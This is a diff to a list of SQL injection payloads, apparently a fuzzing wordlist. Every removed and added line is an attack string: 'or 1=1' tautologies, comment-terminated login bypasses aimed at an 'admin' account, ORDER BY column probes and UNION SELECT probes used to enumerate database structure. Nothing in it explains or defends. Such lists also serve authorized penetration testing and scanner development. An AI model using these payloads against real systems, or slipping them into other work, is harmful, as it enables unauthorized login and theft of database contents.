@@ -2,22 +2,37 @@
 ''
 ' --
 ') --
-' or 0 --
-' or 1 --
-' or 1) --
-' or 1=1 --
+')) --
+or 0
+or 1
+or 1)
+or 1=1
+' or 1=1 -- -
 ' or '1'='1
 ' or '1'='1' --
 ' or 1=1) --
 ' or '1'='1') --
-admin' --
+admin'
 admin@mail.com' --
-administrator' --
+admin' -- -
+admin' LIMIT 1 --
+admin') --
+admin')) --
+admin') LIMIT 1 --
+admin')) LIMIT 1 --
+order by 99
+order by 11
+order by 1
 ' order by 1 --
 ' order by 2 --
 ' order by 10 --
-' union select 1,2 --
-' union select 1,2,3,4,5,6,7,8,9,10 --
+union select 1,2,3
+union select 1,2 --
+union select 1,2,3,4,5,6,7,8,9,10 --
 ' union select 111,222,333,444 --
 ' union select '111','222','333' --
 ' union select 'A','B','C' --
+union distinct select 1,2,3,4
+union distinct select 11,22,33,44,55 --
+(union select 1,2,3)
+(union distinct select 1,2,3,4)
